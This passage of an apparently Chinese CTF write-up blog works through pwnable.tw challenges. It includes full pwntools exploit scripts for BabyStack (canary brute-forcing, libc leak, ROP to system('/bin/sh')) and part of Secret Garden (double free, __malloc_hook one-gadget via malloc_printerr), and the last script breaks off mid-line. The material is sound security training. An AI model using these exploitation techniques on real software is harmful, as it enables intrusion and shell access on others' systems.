class="line">io.recvuntil(&#x27;age: &#x27;,timeout=1)</span><br><span class="line">io.sendline(str(age))</span><br><span class="line">io.recvuntil(&#x27;movie? &#x27;,timeout=1)</span><br><span class="line">io.send(content)</span><br><span class="line">io.recvuntil(&#x27;comment? &lt;y/n&gt;: &#x27;,timeout=1)</span><br><span class="line">io.sendline(choice)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">io.recvuntil(&#x27; name: &#x27;)</span><br><span class="line">io.send(&#x27;a&#x27;*0x3c)</span><br><span class="line">io.recvuntil(&#x27;age: &#x27;)</span><br><span class="line">io.sendline(str(20))</span><br><span class="line">io.recvuntil(&#x27;movie? &#x27;)</span><br><span class="line">io.send(&#x27;b&#x27;*0x38)</span><br><span class="line">io.recvuntil(&#x27;comment: &#x27;)</span><br><span class="line">io.send(&#x27;c&#x27;*0x3c)</span><br><span class="line">io.recvuntil(&#x27;b&#x27;*0x38)</span><br><span class="line">stack=u32(io.recv(4))-0x48-0x88+8</span><br><span class="line">io.recv(4)</span><br><span class="line">fflush=u32(io.recv(4))-11</span><br><span class="line">libc_base=fflush-libc.symbols[&#x27;fflush&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;stack&#x27;,hex(stack))</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">exit=libc_base+libc.symbols[&#x27;_exit&#x27;]</span><br><span class="line">io.sendlineafter(&#x27;comment? &lt;y/n&gt;: &#x27;,&#x27;y&#x27;)</span><br><span class="line"></span><br><span class="line">for i in range(9):</span><br><span class="line">sleep(0.1)</span><br><span class="line">survey(&#x27;a&#x27;*0x3c,20,p32(0)+p32(0x41)+p32(0)*0xe+p32(0)+p32(0x11)+p32(0)*3+p32(0x11),&#x27;c&#x27;*0x3c,&#x27;y&#x27;)</span><br><span class="line">for i in range(90):</span><br><span class="line">sleep(0.1)</span><br><span class="line">survey2(20,&#x27;a&#x27;,&#x27;y&#x27;)</span><br><span class="line">print(&#x27;stack&#x27;,hex(stack))</span><br><span class="line">survey(&#x27;f1ag&#x27;,20,&#x27;A&#x27;,&#x27;a&#x27;*80+p32(1)+p32(stack+0x60),&#x27;y&#x27;)</span><br><span class="line">io.sendafter(&#x27; name: &#x27;,&#x27;sh\x00\x00&#x27;+&#x27;a&#x27;*0x44+p32(stack)+p32(system)+p32(main)+p32(binsh),timeout=0.1)</span><br><span class="line">io.sendlineafter(&#x27;age: &#x27;,str(20))</span><br><span class="line">io.sendafter(&#x27;movie? &#x27;,&#x27;A&#x27;)</span><br><span class="line">io.sendafter(&#x27;comment: &#x27;,&#x27;a&#x27;)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;comment? &lt;y/n&gt;: &#x27;,&#x27;n&#x27;)</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="8-BabyStack"><a href="#8-BabyStack" class="headerlink" title="8.BabyStack"></a>8.BabyStack</h3><p>这个题是我做到现在为止用到的技巧最多的一次，下面我们来逐一分析。</p><p>题目代码挺少，逻辑也挺简单,我们需要注意copy函数中的strcpy函数，<strong>我们知道strcpy函数遇到’\x00’才会停止，如果栈上数据都被填满，那么复制给a1后就会造成溢出</strong>。</p><p>那么我们如何使栈被填满呢？我们可以看到<strong>copy的参数src[128]和login的参数s[128]使用的是相同的栈地址</strong>，并且中间也没有其他函数会改变其栈的内容，所以我们可以填满login中的s[128]，这样在使用copy函数后就会造成溢出，覆盖掉返回地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall copy(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char src[128]; // [rsp+10h] [rbp-80h] BYREF</span><br><span class="line"></span><br><span class="line">  printf(&quot;Copy :&quot;);</span><br><span class="line">  reads((unsigned __int8 *)src, 0x3Fu);</span><br><span class="line">  strcpy(a1, src);</span><br><span class="line">  return puts(&quot;It is magic copy !&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __fastcall login(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; // rax</span><br><span class="line">  char s[128]; // [rsp+10h] [rbp-80h] BYREF</span><br><span class="line"></span><br><span class="line">  printf(&quot;Your passowrd :&quot;);</span><br><span class="line">  reads((unsigned __int8 *)s, 0x7Fu);</span><br><span class="line">  v1 = strlen(s);</span><br><span class="line">  if ( strncmp(s, a1, v1) )</span><br><span class="line">    return puts(&quot;Failed !&quot;);</span><br><span class="line">  state = 1;</span><br><span class="line">  return puts(&quot;Login Success !&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; // rcx</span><br><span class="line">  __int64 v4; // rdx</span><br><span class="line">  char v6[64]; // [rsp+0h] [rbp-60h] BYREF</span><br><span class="line">  __int64 buf[2]; // [rsp+40h] [rbp-20h] BYREF</span><br><span class="line">  char v8[16]; // [rsp+50h] [rbp-10h] BYREF</span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  random = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(random, buf, 0x10uLL);</span><br><span class="line">  v3 = addr;</span><br><span class="line">  v4 = buf[1];</span><br><span class="line">  *(_QWORD *)addr = buf[0];</span><br><span class="line">  v3[1] = v4;</span><br><span class="line">  close(random);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    write(1, &quot;&gt;&gt; &quot;, 3uLL);</span><br><span class="line">    _read_chk(0LL, v8, 16LL, 16LL);</span><br><span class="line">    if ( v8[0] == &#x27;2&#x27; )</span><br><span class="line">      break;</span><br><span class="line">    if ( v8[0] == &#x27;3&#x27; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( state )</span><br><span class="line">        copy(v6);</span><br><span class="line">      else</span><br><span class="line">LABEL_13:</span><br><span class="line">        puts(&quot;Invalid choice&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v8[0] != &#x27;1&#x27; )</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">      if ( state )</span><br><span class="line">        state = 0;</span><br><span class="line">      else</span><br><span class="line">        login(buf);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !state )</span><br><span class="line">    exit(0);</span><br><span class="line">  memcmp(buf, addr, 0x10uLL);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但由于程序保护全开，且没有能够输出栈上的值的功能，所以很难直接泄露出libc_base等其他地址。但我们发现<strong>login函数中有strncmp()，他比较的是a1和s是否相同也就是buf和s是否相同，s是我们的输入可控，buf可以利用前面的溢出，将栈上的值复制到buf及之后，并且可以比较的长度范围为0~0x7f，也就是说我们可以泄露0x7f大小的栈内的值，因此就可以拿到libc_base。</strong></p><p>我们需要输入正确的密码才能使用copy函数，但密码是个随机数，虽然可以利用strncmp()函数爆破，<strong>但因为发现有strlen()函数，我们输入第一个字节为’\x00’，这样strlen()会返回0，就可以直接绕过strncmp()。</strong></p><p>一开始我没有发现canary在哪，执行到最后爆出canary错误，<strong>查看汇编可以看到memcmp比较后，如果不为0则跳转到__stacj_chk_fail函数报错，因为memcmp()是不存在’\x00’截断的，所以需要我们必须爆破出密码。</strong></p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211103201504616.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211103201504616.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211103201504616"></p><p>最后，在写rop的时候，<strong>需要用到p64()但发现p64()存在’\x00’，会截断，因此我采取从后往前写的措施，即先将最后的system的函数地址写入栈中，然后利用strcpy()函数会复值’\x00’的特性将p64的高两位地址置0</strong>，这样就能成功的写入rop。</p><p>exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./babystack&#x27;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27; ,10205)</span><br><span class="line">elf=ELF(&#x27;./babystack&#x27;)</span><br><span class="line">#libc=elf.libc</span><br><span class="line">libc=ELF(&#x27;./libc_64.so.6&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line"></span><br><span class="line">def login(password):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendafter(&#x27;passowrd :&#x27;,password)</span><br><span class="line"></span><br><span class="line">def login2():</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;1&#x27;)</span><br><span class="line"></span><br><span class="line">def copy(content):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;3&#x27;)</span><br><span class="line">io.sendafter(&#x27;Copy :&#x27;,content)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line"></span><br><span class="line">login(&#x27;\x00&#x27;+&#x27;a&#x27;*0x3f)</span><br><span class="line"></span><br><span class="line">copy(&#x27;a&#x27;*0x3e+&#x27;\x00&#x27;)</span><br><span class="line">canary=&#x27;&#x27;</span><br><span class="line">for j in range(0x10):</span><br><span class="line">login2()</span><br><span class="line">for i in range(0xff):</span><br><span class="line">if i == 10 or i == 0:</span><br><span class="line">continue</span><br><span class="line">login(canary+p8(i)+&#x27;\x00&#x27;)</span><br><span class="line">if io.recvuntil(&#x27;!\n&#x27;)[-9:] == &#x27;uccess !\n&#x27;:</span><br><span class="line">canary+=p8(i)</span><br><span class="line">break</span><br><span class="line">canary</span><br><span class="line">login2()</span><br><span class="line">login(&#x27;\x00&#x27;+&#x27;a&#x27;*0x47)</span><br><span class="line">copy(&#x27;a&#x27;*0x3f)</span><br><span class="line">payload=&#x27;aaaaaaaa&#x27;</span><br><span class="line">for j in range(6):</span><br><span class="line">login2()</span><br><span class="line">for i in range(0xff):</span><br><span class="line">if i == 10 or i == 0:</span><br><span class="line">continue</span><br><span class="line">login(payload+p8(i)+&#x27;\x00&#x27;)</span><br><span class="line">if io.recvuntil(&#x27;!\n&#x27;)[-9:] == &#x27;uccess !\n&#x27;:</span><br><span class="line">payload+=p8(i)</span><br><span class="line">break</span><br><span class="line">IOsetbuf=u64(payload[-6:].ljust(8,&#x27;\x00&#x27;))-9</span><br><span class="line">libc_base=IOsetbuf-libc.symbols[&#x27;_IO_file_setbuf&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">print(&#x27;binsh&#x27;,hex(binsh))</span><br><span class="line">pop_rdi=libc_base+libc.search(asm(&#x27;pop rdi\nret&#x27;)).next()</span><br><span class="line">login2()</span><br><span class="line">login(&#x27;\x00&#x27;+&#x27;a&#x27;*0x3f+canary[:8]+canary[8:16]+&#x27;aaaaaaaa&#x27;*5+p32(system&amp;0xffffffff)+p16((system&gt;&gt;32)&amp;0xffff)+&#x27;\n&#x27;)</span><br><span class="line">copy(&#x27;a&#x27;*0x3f)</span><br><span class="line"></span><br><span class="line">login2()</span><br><span class="line">login(&#x27;\x00&#x27;+&#x27;a&#x27;*0x3f+canary[:8]+canary[8:16]+&#x27;aaaaaaaa&#x27;*4+&#x27;aaaaaaa&#x27;+&#x27;\n&#x27;)</span><br><span class="line">copy(&#x27;a&#x27;*0x3f)</span><br><span class="line"></span><br><span class="line">login2()</span><br><span class="line">login(&#x27;\x00&#x27;+&#x27;a&#x27;*0x3f+canary[:8]+canary[8:16]+&#x27;aaaaaaaa&#x27;*4+p32(binsh&amp;0xffffffff)+p16((binsh&gt;&gt;32)&amp;0xffff)+&#x27;\n&#x27;)</span><br><span class="line">copy(&#x27;a&#x27;*0x3f)</span><br><span class="line"></span><br><span class="line">login2()</span><br><span class="line">login(&#x27;\x00&#x27;+&#x27;a&#x27;*0x3f+canary[:8]+canary[8:16]+&#x27;aaaaaaaa&#x27;*3+&#x27;aaaaaaa&#x27;+&#x27;\n&#x27;)</span><br><span class="line">copy(&#x27;a&#x27;*0x3f)</span><br><span class="line"></span><br><span class="line">login2()</span><br><span class="line">login(&#x27;\x00&#x27;+&#x27;a&#x27;*0x3f+canary[:8]+canary[8:16]+&#x27;aaaaaaaa&#x27;*3+p32(pop_rdi&amp;0xffffffff)+p16((pop_rdi&gt;&gt;32)&amp;0xffff)+&#x27;\n&#x27;)</span><br><span class="line">copy(&#x27;a&#x27;*0x3f)</span><br><span class="line"></span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;&gt;&gt; &#x27;,&#x27;2&#x27;)</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="9-Secret-Garden"><a href="#9-Secret-Garden" class="headerlink" title="9.Secret Garden"></a>9.Secret Garden</h3><p>题目的漏洞点挺简单的，就是free后指针未置0</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211108110017579.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211108110017579.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211108110017579"></p><p>因此可以double free，打__malloc_hook指针，设置为onegadget，因为gadget需要满足一定的条件，由于栈中的数据不理想，利用realloc调栈也没有办法满足条件，所以在这里我们利用malloc错误时会调用<code>malloc_printerr</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), 0))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = &quot;free(): invalid pointer&quot;;</span><br><span class="line">  errout:</span><br><span class="line">    if (!have_lock &amp;&amp; locked)</span><br><span class="line">      (void) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>接着调用<code>__libc_message</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">malloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  /* Avoid using this arena in future.  We do not attempt to synchronize this</span><br><span class="line">     with anything else because we minimally want to ensure that __libc_message</span><br><span class="line">     gets its resources safely without stumbling on the current corruption.  */</span><br><span class="line">  if (ar_ptr)</span><br><span class="line">    set_arena_corrupt (ar_ptr);</span><br><span class="line"></span><br><span class="line">  if ((action &amp; 5) == 5)</span><br><span class="line">    __libc_message (action &amp; 2, &quot;%s\n&quot;, str);</span><br><span class="line">  else if (action &amp; 1)</span><br><span class="line">    &#123;</span><br><span class="line">      char buf[2 * sizeof (uintptr_t) + 1];</span><br><span class="line"></span><br><span class="line">      buf[sizeof (buf) - 1] = &#x27;\0&#x27;;</span><br><span class="line">      char *cp = _itoa_word ((uintptr_t) ptr, &amp;buf[sizeof (buf) - 1], 16, 0);</span><br><span class="line">      while (cp &gt; buf)</span><br><span class="line">        *--cp = &#x27;0&#x27;;</span><br><span class="line"></span><br><span class="line">      __libc_message (action &amp; 2, &quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;,</span><br><span class="line">                      __libc_argv[0] ? : &quot;&lt;unknown&gt;&quot;, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">  else if (action &amp; 2)</span><br><span class="line">    abort ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着调用<code>BEFORE_ABORT</code>，且定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">__libc_message (int do_abort, const char *fmt, ...)</span><br><span class="line">···</span><br><span class="line">···</span><br><span class="line">  if (do_abort)</span><br><span class="line">    &#123;</span><br><span class="line">      BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">      /* Kill the application.  */</span><br><span class="line">      abort ();</span><br><span class="line">    &#125;</span><br><span class="line">···</span><br><span class="line">···</span><br><span class="line">#define BEFORE_ABORTbacktrace_and_maps</span><br></pre></td></tr></table></figure><p>因此又调用了<code>backtrace_and_maps</code>,函数调用了<code>__backtrace</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">backtrace_and_maps (int do_abort, bool written, int fd)</span><br><span class="line">&#123;</span><br><span class="line">  if (do_abort &gt; 1 &amp;&amp; written)</span><br><span class="line">    &#123;</span><br><span class="line">      void *addrs[64];</span><br><span class="line">#define naddrs (sizeof (addrs) / sizeof (addrs[0]))</span><br><span class="line">      int n = __backtrace (addrs, naddrs);#调用__backtrace</span><br><span class="line">      if (n &gt; 2)</span><br><span class="line">        &#123;</span><br><span class="line">#define strnsize(str) str, strlen (str)</span><br><span class="line">#define writestr(str) write_not_cancel (fd, str)</span><br><span class="line">          writestr (strnsize (&quot;======= Backtrace: =========\n&quot;));</span><br><span class="line">          __backtrace_symbols_fd (addrs + 1, n - 1, fd);</span><br><span class="line"></span><br><span class="line">          writestr (strnsize (&quot;======= Memory map: ========\n&quot;));</span><br><span class="line">          int fd2 = open_not_cancel_2 (&quot;/proc/self/maps&quot;, O_RDONLY);</span><br><span class="line">          char buf[1024];</span><br><span class="line">          ssize_t n2;</span><br><span class="line">          while ((n2 = read_not_cancel (fd2, buf, sizeof (buf))) &gt; 0)</span><br><span class="line">            if (write_not_cancel (fd, buf, n2) != n2)</span><br><span class="line">              break;</span><br><span class="line">          close_not_cancel_no_status (fd2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__backtrace</code>函数定义如下，发现其调用了<code>__libc_once (once, init);</code> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">__backtrace (void **array, int size)</span><br><span class="line">&#123;</span><br><span class="line">  struct trace_arg arg = &#123; .array = array, .cfa = 0, .size = size, .cnt = -1 &#125;;</span><br><span class="line"></span><br><span class="line">  if (size &lt;= 0)</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">#ifdef SHARED</span><br><span class="line">  __libc_once_define (static, once);</span><br><span class="line"></span><br><span class="line">  __libc_once (once, init);</span><br><span class="line">  if (unwind_backtrace == NULL)</span><br><span class="line">    return 0;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  unwind_backtrace (backtrace_helper, &amp;arg);</span><br><span class="line"></span><br><span class="line">  /* _Unwind_Backtrace seems to put NULL address above</span><br><span class="line">     _start.  Fix it up here.  */</span><br><span class="line">  if (arg.cnt &gt; 1 &amp;&amp; arg.array[arg.cnt - 1] == NULL)</span><br><span class="line">    --arg.cnt;</span><br><span class="line">  return arg.cnt != -1 ? arg.cnt : 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__libc_once (once, init);中的init如下，调用了__libc_dlopen (“libgcc_s.so.1”)，又因为__libc_dlopen (“libgcc_s.so.1”)这个函数需要malloc为它分配内存，因此又会调用malloc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">init (void)</span><br><span class="line">&#123;</span><br><span class="line">  libgcc_handle = __libc_dlopen (&quot;libgcc_s.so.1&quot;);</span><br><span class="line"></span><br><span class="line">  if (libgcc_handle == NULL)</span><br><span class="line">    return;</span><br><span class="line"></span><br><span class="line">  unwind_backtrace = __libc_dlsym (libgcc_handle, &quot;_Unwind_Backtrace&quot;);</span><br><span class="line">  unwind_getip = __libc_dlsym (libgcc_handle, &quot;_Unwind_GetIP&quot;);</span><br><span class="line">  if (unwind_getip == NULL)</span><br><span class="line">    unwind_backtrace = NULL;</span><br><span class="line">  unwind_getcfa = (__libc_dlsym (libgcc_handle, &quot;_Unwind_GetCFA&quot;)</span><br><span class="line">  ?: dummy_getcfa);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个调用关系如下图</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211108114616202.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211108114616202.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211108114616202"></p><p>可以看见这时候会先执行malloc_hook，可以看见栈上有大量的0，满足了onegadget的要求。</p><p><img src="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211108114744647.png" class="lazyload placeholder" data-srcset="/2021/10/21/pwnable-tw%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20211108114744647.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211108114744647"></p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./secretgarden&#x27;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc_64.so.6&#x27;&#125;)</span><br><span class="line">io=remote(&#x27;chall.pwnable.tw&#x27; ,10203)</span><br><span class="line">#io=process(&#x27;./secretgarden&#x27;)</span><br><span class="line">elf=ELF(&#x27;./secretgarden&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc_64.so.6&#x27;)</span><br><span class="line">#libc=ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(length,name,color):</span><br><span class="line">io.sendlineafter(&#x27;choice : &#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Length of the name :&#x27;,str(length))</span><br><span class="line">io.sendafter(&#x27;name of flower :&#x27;,name)</span><br><span class="line">io.sendlineafter(&#x27;color of the flower 